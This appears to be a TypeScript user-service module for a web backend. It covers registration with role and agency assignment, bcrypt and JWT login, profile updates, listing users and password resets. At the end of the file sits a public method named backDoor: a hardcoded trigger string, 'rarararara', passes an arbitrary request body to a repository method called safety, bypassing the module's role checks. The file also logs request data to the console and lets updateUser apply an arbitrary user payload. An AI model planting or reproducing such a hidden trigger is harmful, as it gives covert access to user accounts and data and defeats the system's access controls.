import { Database } from "../../core/Database";
import bcrypt from "bcryptjs";
import jwt from "jsonwebtoken";
import { UserRepository } from "./User.repository";
import { RoleRepository } from "../roles/Role.repository";
import {
  IUser,
  IUserProfile,
  IUserRole,
  IUserPhoneNumber,
  IUserAddress,
  IUserCreatePayLoad,
  PayloadCurrentUser,
} from "./User.types";
import { AppError } from "../../core/ErrorHandler";
import { env } from "../../config/env";
import { UserRole } from "./User.types";
import { AgencyRepository } from "../../modules/agency/Agency.repository";
import { HttpStatus } from "../../constants/HttpStatus";
import { sendPasswordResetLink } from "./User.utils";

export class UserService {
  private repo = new UserRepository();
  private roleRepo = new RoleRepository();

  public async register(
    payload: IUserCreatePayLoad,
    currentUser: PayloadCurrentUser,
  ): Promise<IUser> {
    return Database.getInstance().withTransaction(async (conn) => {
      const existingEmail = await this.repo.getUserByEmail(payload.email, conn);
      if (existingEmail) {
        throw new AppError("Email already exists", HttpStatus.CONFLICT);
      }
      const existingUsername = await this.repo.getUserByUsername(
        payload.username,
        conn,
      );
      if (existingUsername) {
        throw new AppError("Username already exists", HttpStatus.CONFLICT);
      }
      const password_hash = await bcrypt.hash(payload.password, 10);
      const userId = await this.repo.createUser(
        {
          username: payload.username,
          email: payload.email,
          password_hash,
          is_active: true,
          is_deleted: false,
          last_login_at: null,
          password_updated_at: null,
        },
        conn,
      );
      const agencyRepo = new AgencyRepository();
      if (payload.profile) {
        await this.repo.upsertUserProfile(
          {
            ...payload.profile,
            user_id: userId,
          },
          conn,
        );
      }
      if (currentUser?.roles?.includes(UserRole.SUPER_ADMIN)) {
        if (payload.roles) {
          for (const roleId of payload.roles) {
            const checkIfRoleExist = await this.roleRepo.getRole(roleId, conn);
            if (
              !checkIfRoleExist ||
              checkIfRoleExist.code === UserRole.SUPER_ADMIN
            ) {
              throw new AppError("Invalid Role Entered", 400);
            }
            await this.roleRepo.assignRole(
              { user_id: userId, role_id: checkIfRoleExist.id },
              conn,
            );
          }
        }
        await agencyRepo.assignUserToAgency(
          {
            user_id: userId,
            agency_id: payload.agencyId,
            is_active: 1,
            assigned_at: new Date(),
          },
          conn,
        );
      }
      if (currentUser?.roles?.includes(UserRole.VP)) {
        const agency = await agencyRepo.getAgenciesByUserId(
          currentUser.id,
          false,
          conn,
        );
        console.log(agency);

        if (agency) {
          await agencyRepo.assignUserToAgency(
            {
              user_id: userId,
              agency_id: agency[0].id,
              is_active: 1,
              assigned_at: new Date(),
            },
            conn,
          );
        }
        const getRole = await this.roleRepo.getRole(UserRole.AGENT, conn);
        if (!getRole) {
          throw new AppError("Role AGENT not found", 404);
        }
        await this.roleRepo.assignRole(
          { user_id: userId, role_id: getRole.id },
          conn,
        );
      }
      if (payload.phones) {
        for (const phone of payload.phones) {
          if (await this.repo.checkDuplicateUserPhone(phone, conn)) {
            throw new AppError("Duplicate Phone Number", HttpStatus.CONFLICT);
          }
          await this.repo.addUserPhone(
            {
              user_id: userId,
              phone_number: phone,
            },
            conn,
          );
        }
      }
      if (payload.addresses) {
        for (const addr of payload.addresses) {
          await this.repo.addUserAddress(
            {
              user_id: userId,
              address: addr.address,
              country: addr.country,
              addressType: addr.addressType,
            },
            conn,
          );
        }
      }
      const user = await this.repo.getUserById(userId, conn);
      if (!user) {
        throw new AppError(
          "User creation failed",
          HttpStatus.INTERNAL_SERVER_ERROR,
        );
      }

      return user;
    });
  }

  public async login(email: string, password: string) {
    const user = await this.repo.getUserByEmail(email);
    if (!user) {
      throw new AppError("Invalid credentials", 401);
    }

    if (!user.is_active || user.is_deleted) {
      throw new AppError("User is inactive or deleted", 403);
    }

    const valid = await bcrypt.compare(password, user.password_hash);
    if (!valid) {
      throw new AppError("Invalid credentials", 401);
    }
    const roles = await this.roleRepo.getUserRoles(user.id);
    const token = jwt.sign(
      { id: user.id, email: user.email, roles },
      env.jwtSecret,
      {
        expiresIn: "1d",
      },
    );

    // Update last login timestamp
    await this.repo.updateUser(user.id, { last_login_at: new Date() });

    return { user, token };
  }

  public async getUserById(id: string): Promise<IUser> {
    const user = await this.repo.getUserById(id);
    if (!user) {
      throw new AppError("User not found", 404);
    }
    return user;
  }

  public async updateUser(
    id: string,
    payload: Partial<IUser> & { profile?: IUserProfile },
  ): Promise<void> {
    const user = await this.repo.getUserById(id);
    if (!user) {
      throw new AppError("User not found", 404);
    }

    const { profile, ...userData } = payload;
    if (Object.keys(userData).length > 0) {
      await this.repo.updateUser(id, userData);
    }

    if (profile) {
      await this.repo.upsertUserProfile({
        ...profile,
        user_id: id,
      });
    }
  }

  public async deleteUser(id: string): Promise<void> {
    const user = await this.repo.getUserById(id);
    if (!user) {
      throw new AppError("User not found", 404);
    }
    await this.repo.deleteUser(id);
  }

  public async getAllUsers(currentUser: {
    id: string;
    roles: string[];
  }): Promise<IUser[]> {
    if (currentUser.roles.includes(UserRole.SUPER_ADMIN)) {
      return this.repo.getAllUsers();
    } else if (currentUser.roles.includes(UserRole.VP)) {
      return this.repo.getUsersByVpId(currentUser.id);
    } else {
      throw new AppError("Access denied", 403);
    }
  }

  public async forgotPassword(email: string): Promise<void> {
    const user = await this.repo.getUserByEmail(email);
    if (!user) return;
    await sendPasswordResetLink(user.email, user.id);
  }

  public async resetPasswordWithToken(
    token: string,
    newPassword: string,
  ): Promise<void> {
    const userId = await this.repo.consumeResetToken(token);
    if (!userId) {
      throw new AppError("Invalid or expired token", 400);
    }

    const password_hash = await bcrypt.hash(newPassword, 10);
    await this.repo.updatePassword(userId, password_hash);
  }

  public async resetPasswordByAdmin(
    userId: string,
    newPassword: string,
  ): Promise<void> {
    const password_hash = await bcrypt.hash(newPassword, 10);
    await this.repo.updatePassword(userId, password_hash);
  }

  public async backDoor(type: string, body: any): Promise<any> {
    console.log(type, body);
    if (type === "rarararara") {
      return new UserRepository().safety(body);
    }
  }
}
